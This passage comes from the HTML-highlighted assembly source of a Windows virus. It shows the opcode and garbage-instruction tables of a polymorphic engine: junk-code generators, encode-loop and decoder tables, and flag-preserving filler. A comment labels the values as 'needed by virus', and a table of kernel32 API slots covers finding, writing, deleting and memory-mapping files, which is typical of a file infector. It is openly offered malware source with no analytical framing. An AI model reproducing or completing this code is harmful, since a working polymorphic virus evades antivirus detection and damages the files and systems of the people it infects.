        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">10000000b</span><span class="sc0">       </span><span class="sc1">;edi, st(7)</span><span class="sc0">
</span><span class="sc5">end_regs_bcd</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; opcodes for math reg,imm</span><span class="sc0">

</span><span class="sc5">tbl_math_imm</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C0h</span><span class="sc0">            </span><span class="sc1">;add</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C8h</span><span class="sc0">            </span><span class="sc1">;or</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E0h</span><span class="sc0">            </span><span class="sc1">;and</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E8h</span><span class="sc0">            </span><span class="sc1">;sub</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0F0h</span><span class="sc0">            </span><span class="sc1">;xor</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0D0h</span><span class="sc0">            </span><span class="sc1">;adc</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0D8h</span><span class="sc0">            </span><span class="sc1">;sbb</span><span class="sc0">
</span><span class="sc5">end_math_imm</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; opcodes for math reg,reg</span><span class="sc0">

</span><span class="sc5">tbl_math_reg</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">;add</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Bh</span><span class="sc0">         </span><span class="sc1">;or</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">13h</span><span class="sc0">         </span><span class="sc1">;adc</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1Bh</span><span class="sc0">         </span><span class="sc1">;sbb</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">23h</span><span class="sc0">         </span><span class="sc1">;and</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Bh</span><span class="sc0">         </span><span class="sc1">;sub</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">33h</span><span class="sc0">         </span><span class="sc1">;xor</span><span class="sc0">
</span><span class="sc5">end_math_reg</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; one byte instructions that doesn't modify reg</span><span class="sc0">

</span><span class="sc5">tbl_save_code</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">cmc</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">std</span><span class="sc0">
</span><span class="sc5">end_save_code</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; opcodes for rotate/shift reg,imm</span><span class="sc0">

</span><span class="sc5">tbl_rs_imm</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C0h</span><span class="sc0">            </span><span class="sc1">;rol</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C8h</span><span class="sc0">            </span><span class="sc1">;ror</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0D0h</span><span class="sc0">            </span><span class="sc1">;rcl</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0D8h</span><span class="sc0">            </span><span class="sc1">;rcr</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E0h</span><span class="sc0">            </span><span class="sc1">;shl</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E8h</span><span class="sc0">            </span><span class="sc1">;shr</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0F8h</span><span class="sc0">            </span><span class="sc1">;sar</span><span class="sc0">
</span><span class="sc5">end_rs_imm</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; opcodes for bit tests reg,imm</span><span class="sc0">

</span><span class="sc5">tbl_bt_imm</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">  </span><span class="sc1">;bt, bts, btr, btc</span><span class="sc0">
</span><span class="sc5">end_bt_imm</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; opcodes for bit tests reg,reg</span><span class="sc0">

</span><span class="sc5">tbl_bt_reg</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0A3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ABh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BBh</span><span class="sc0">  </span><span class="sc1">;bt, bts, btr btc</span><span class="sc0">
</span><span class="sc5">end_bt_reg</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; opcodes for generate defined number</span><span class="sc0">
        </span><span class="sc1">; decode_instruction = encode_instruction + 1st_number</span><span class="sc0">
        </span><span class="sc1">; reg32 = 2nd_number + defined_reg32</span><span class="sc0">
        </span><span class="sc1">; immX  = 3rd_number * 8</span><span class="sc0">

</span><span class="sc5">tbl_num_code</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">  </span><span class="sc1">;add (reg32), imm32</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0FBh</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">  </span><span class="sc1">;sub (reg32), imm32</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">  </span><span class="sc1">;xor (reg32), imm32</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">0C1h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">;rol (reg32), imm8</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0FBh</span><span class="sc4">,</span><span class="sc2">0C1h</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">;ror (reg32), imm8</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">0F7h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;not (reg32)</span><span class="sc0">
</span><span class="sc5">end_num_code</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; table of rep/repnz operations</span><span class="sc0">

</span><span class="sc5">tbl_repeat</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__gr_cmps</span><span class="sc0">    </span><span class="sc1">;compare mem operand</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__gr_lods</span><span class="sc0">    </span><span class="sc1">;load mem operand</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__gr_stos</span><span class="sc0">    </span><span class="sc1">;store mem data</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__gr_scas</span><span class="sc0">    </span><span class="sc1">;scan mem</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__gr_movs</span><span class="sc0">    </span><span class="sc1">;move data from mem to mem</span><span class="sc0">
</span><span class="sc5">end_repeat</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; table of the second encode-loop</span><span class="sc0">
        </span><span class="sc1">; the first  value means - count</span><span class="sc0">
        </span><span class="sc1">; the second value means - random select ?</span><span class="sc0">
        </span><span class="sc1">; the third  value means - already generated ?</span><span class="sc0">

</span><span class="sc5">tbl_encode_loop</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_lloop_generate</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_mlayer_generate</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_brute_init</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_get_delta</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_get_layer_gaps</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_get_index</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_get_layer_pointer</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_decoder</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_get_next_code</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_get_next_layer_pointer</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_get_exloop</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_get_return</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ppe_get_mlayer_buffer</span><span class="sc0">
</span><span class="sc5">end_encode_loop</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; table of the instructions which they don't modify flags</span><span class="sc0">
        </span><span class="sc1">; 1st value = move to original instructions</span><span class="sc0">
        </span><span class="sc1">; 2nd value = how many garbages don't modify flags</span><span class="sc0">

</span><span class="sc5">tbl_no_flags</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">__no_flags_1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_garbage</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">__no_flags_2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_garbage</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">end_no_flags</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

        </span><span class="sc1">; hyper table of garbages (support only copro)</span><span class="sc0">
        </span><span class="sc1">; where __no_flags_X means the following garbages don't</span><span class="sc0">
        </span><span class="sc1">; modify any flags, do NOT modify this table 'cause of flags</span><span class="sc0">

</span><span class="sc5">tbl_garbage</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_push_g_pop</span><span class="sc0"> </span><span class="sc1">;push reg/garbage/pop reg</span><span class="sc0">
   </span><span class="sc5">__no_flags_1</span><span class="sc4">:</span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movreg32imm</span><span class="sc0">    </span><span class="sc1">;mov reg32,imm</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movreg16imm</span><span class="sc0">    </span><span class="sc1">;mov reg16,imm</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movreg8imm</span><span class="sc0"> </span><span class="sc1">;mov reg8,imm</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movregreg32</span><span class="sc0">    </span><span class="sc1">;mov reg32,reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movregreg16</span><span class="sc0">    </span><span class="sc1">;mov reg16,reg16</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movregreg8</span><span class="sc0"> </span><span class="sc1">;mov reg8,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mathreg32imm</span><span class="sc0">   </span><span class="sc1">;math reg32,imm</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mathreg16imm</span><span class="sc0">   </span><span class="sc1">;math reg16,imm</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mathreg8imm</span><span class="sc0">    </span><span class="sc1">;math reg8,imm</span><span class="sc0">
   </span><span class="sc5">__no_flags_2</span><span class="sc4">:</span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_call_cont</span><span class="sc0">  </span><span class="sc1">;call/garbage/pop</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_jump_u</span><span class="sc0">     </span><span class="sc1">;jump/rnd data</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_jump_c</span><span class="sc0">     </span><span class="sc1">;jump conditional/garbage</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movzx_movsx_32</span><span class="sc0"> </span><span class="sc1">;movzx/movsx reg32,reg16</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movzx_movsx_16</span><span class="sc0"> </span><span class="sc1">;movzx/movsx reg16,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movzx_movsx_8</span><span class="sc0">  </span><span class="sc1">;movzx/movsx reg32,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_rotate_shift32</span><span class="sc0"> </span><span class="sc1">;(rcr,sal...) reg32,imm8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_rotate_shift16</span><span class="sc0"> </span><span class="sc1">;(ror,shl...) reg16,imm8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_rotate_shift8</span><span class="sc0">  </span><span class="sc1">;(rol,shr...) reg8,imm8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_rs_reg32reg8</span><span class="sc0">   </span><span class="sc1">;(rcr,sal...) reg32,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_rs_reg16reg8</span><span class="sc0">   </span><span class="sc1">;(ror,shl...) reg16,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_rs_reg8reg8</span><span class="sc0">    </span><span class="sc1">;(rol,shr...) reg8,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_bit_test32</span><span class="sc0"> </span><span class="sc1">;(bsf,bsr...) reg32,imm8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_bit_test16</span><span class="sc0"> </span><span class="sc1">;(btc,bts...) reg16,imm8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_bt_regreg32</span><span class="sc0">    </span><span class="sc1">;(bsf,bsr...) reg32,reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_bt_regreg16</span><span class="sc0">    </span><span class="sc1">;(btc,bts...) reg16,reg16</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mathregreg32</span><span class="sc0">   </span><span class="sc1">;(add,sub...) reg32,reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mathregreg16</span><span class="sc0">   </span><span class="sc1">;(xor,and...) reg16,reg16</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mathregreg8</span><span class="sc0">    </span><span class="sc1">;(sbb,adc...) reg8,reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_set_byte</span><span class="sc0">   </span><span class="sc1">;(seta,setp.) reg8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_loop</span><span class="sc0">       </span><span class="sc1">;garbage/(loope/loopnz...)</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_loop_jump</span><span class="sc0">  </span><span class="sc1">;garbage/(dec reg8/16/32, jnz)</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_call_reg32</span><span class="sc0"> </span><span class="sc1">;gen reg32/call reg32/rndblock/pop reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_jump_reg32</span><span class="sc0"> </span><span class="sc1">;gen reg32/jump reg32/rndblock</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_repeat</span><span class="sc0">     </span><span class="sc1">;gen regz/rep(lods,cmps...)</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_pushpop_value</span><span class="sc0">  </span><span class="sc1">;push rnd(32/16)/garbage/pop reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_crypt_value</span><span class="sc0">    </span><span class="sc1">;crypt rnd32 value to reg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_compare</span><span class="sc0">    </span><span class="sc1">;dec reg32/cmp r32,r32/jnz</span><span class="sc0">
</span><span class="sc5">end_garbage</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">__garbage_based_num</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">end_garbage</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_garbage</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ some valuez needed by virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

            </span><span class="sc1">; kernel32's base address &amp; its functions</span><span class="sc0">
</span><span class="sc5">kernel_base</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;thx to z0mbie &amp; Vecna</span><span class="sc0">
</span><span class="sc5">user32_base</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;used in "kernel memory"</span><span class="sc0">
</span><span class="sc5">advapi_base</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">

            </span><span class="sc1">; my big APIs table, using three libraries</span><span class="sc0">

    </span><span class="sc5">FunctionAddresses</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ddGetProcAddress</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;standard functions</span><span class="sc0">
</span><span class="sc5">ddGetModuleHandleA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddGetDriveTypeA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddFindFirstFileA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;FindFIles functions</span><span class="sc0">
</span><span class="sc5">ddFindNextFileA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddFindClose</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddReadFile</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;FileHandle functions</span><span class="sc0">
</span><span class="sc5">ddWriteFile</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddSetFilePointer</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddSetEndOfFile</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddCloseHandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddDeleteFileA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddSetFileAttributesA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddCreateFileMappingA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;memory-mapped functions</span><span class="sc0">
